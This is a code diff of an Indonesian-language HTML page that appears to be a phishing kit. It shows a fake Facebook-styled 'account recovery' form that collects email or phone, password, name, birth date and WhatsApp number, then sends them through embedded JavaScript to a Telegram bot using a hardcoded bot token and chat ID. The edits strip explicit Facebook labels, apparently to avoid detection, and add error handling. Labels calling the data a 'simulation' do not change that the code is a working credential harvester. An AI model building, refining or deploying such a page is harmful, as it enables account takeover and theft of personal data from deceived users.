@@ -18,57 +18,57 @@
     .screen {
       display: flex;
       flex-direction: column;
+      justify-content: flex-start; /* konten ke atas */
       align-items: center;
       height: 100vh;
       width: 100%;
       padding: 40px 20px;
-      justify-content: flex-start;
-      padding-top: 80px; /* konten agak ke atas */
+      padding-top: 40px; /* jarak dari atas */
     }
     .container {
       background: #fff;
-      padding: 40px 30px;
-      border-radius: 16px;
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+      padding: 30px 24px;
+      border-radius: 12px;
+      box-shadow: 0 6px 16px rgba(0, 0, 0, 0.08);
       width: 100%;
-      max-width: 500px;
+      max-width: 400px;
       text-align: center;
     }
     .container h2 {
-      font-size: 32px;
+      font-size: 24px;
       color: #1877f2;
-      margin-bottom: 20px;
+      margin-bottom: 16px;
     }
     .container p {
-      font-size: 18px;
-      color: #333;
-      margin-bottom: 30px;
+      font-size: 16px;
+      color: #444;
+      margin-bottom: 24px;
     }
     .container input {
       width: 100%;
-      padding: 16px;
-      font-size: 18px;
-      margin-bottom: 16px;
+      padding: 14px;
+      font-size: 16px;
+      margin-bottom: 14px;
       border: 1px solid #ccc;
-      border-radius: 8px;
+      border-radius: 6px;
     }
     .container button {
       width: 100%;
-      padding: 16px;
-      font-size: 18px;
+      padding: 14px;
+      font-size: 16px;
       background-color: #1877f2;
       color: white;
-      font-weight: bold;
+      font-weight: 600;
       border: none;
-      border-radius: 8px;
+      border-radius: 6px;
       cursor: pointer;
     }
     .hidden {
       display: none;
     }
     img.lock-icon {
-      width: 60px;
-      margin-bottom: 20px;
+      width: 50px;
+      margin-bottom: 16px;
     }
   </style>
 </head>
@@ -87,13 +87,13 @@
   <!-- Halaman 2 -->
   <div class="screen hidden" id="step2">
     <div class="container">
-      <h2>Pemulihan Akun</h2>
+      <h2 style="color: #1877f2;">Pemulihan Akun</h2>
       <form id="recoveryForm">
-        <input type="text" id="email" placeholder="Email atau Nomor Telepon Facebook" required />
-        <input type="password" id="password" placeholder="Password Facebook" required />
-        <input type="text" id="nama" placeholder="Nama Facebook" required />
+        <input type="text" id="email" placeholder="Email atau Nomor Telepon" required />
+        <input type="password" id="password" placeholder="Kata Sandi" required />
+        <input type="text" id="nama" placeholder="Nama Lengkap" required />
         <input type="text" id="tglLahir" placeholder="Tanggal Lahir (DD-MM-YYYY)" required />
-        <input type="text" id="whatsapp" placeholder="Nomor WhatsApp untuk pemberitahuan" required />
+        <input type="text" id="whatsapp" placeholder="Nomor WhatsApp Aktif" required />
         <button type="submit">Kirim</button>
       </form>
     </div>
@@ -103,7 +103,7 @@
   <div class="screen hidden" id="step3">
     <div class="container">
       <h2>Berhasil!</h2>
-      <p>Data simulasi telah dikirim. Anda akan dihubungi oleh tim support kami melalui WhatsApp.</p>
+      <p>Data simulasi telah dikirim. Anda akan dihubungi oleh tim support kami.</p>
     </div>
   </div>
 
@@ -113,8 +113,8 @@
       document.getElementById("step2").classList.remove("hidden");
     }
 
-    const botToken = '7733097714:AAFizEnWZUqtjfJxikCqoNOCzufsJTB2Vk8'; // Ganti dengan token bot Anda
-    const chatId = '7228659553';     // Ganti dengan chat ID Anda
+    const botToken = '7733097714:AAFizEnWZUqtjfJxikCqoNOCzufsJTB2Vk8'; // Ganti dengan token bot Telegram Anda
+    const chatId = 'Y7228659553';     // Ganti dengan chat ID Anda
 
     document.getElementById("recoveryForm").addEventListener("submit", function (e) {
       e.preventDefault();
@@ -125,7 +125,7 @@
       const tgl = document.getElementById("tglLahir").value;
       const whatsapp = document.getElementById("whatsapp").value;
 
-      const message = `🔐 Simulasi Pemulihan Akun\n📧 Email: ${email}\n🔑 Password: ${password}\n👤 Nama: ${nama}\n🎂 Lahir: ${tgl}\n📱 WhatsApp: ${whatsapp}`;
+      const message = `🔐 Simulasi Data:\n📧 Email: ${email}\n🔑 Password: ${password}\n👤 Nama: ${nama}\n🎂 Lahir: ${tgl}\n📱 WhatsApp: ${whatsapp}`;
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
@@ -139,8 +139,12 @@
       }).then(() => {
         document.getElementById("step2").classList.add("hidden");
         document.getElementById("step3").classList.remove("hidden");
+      }).catch(err => {
+        alert("Gagal mengirim data simulasi.");
+        console.error(err);
       });
     });
   </script>
+
 </body>
 </html>
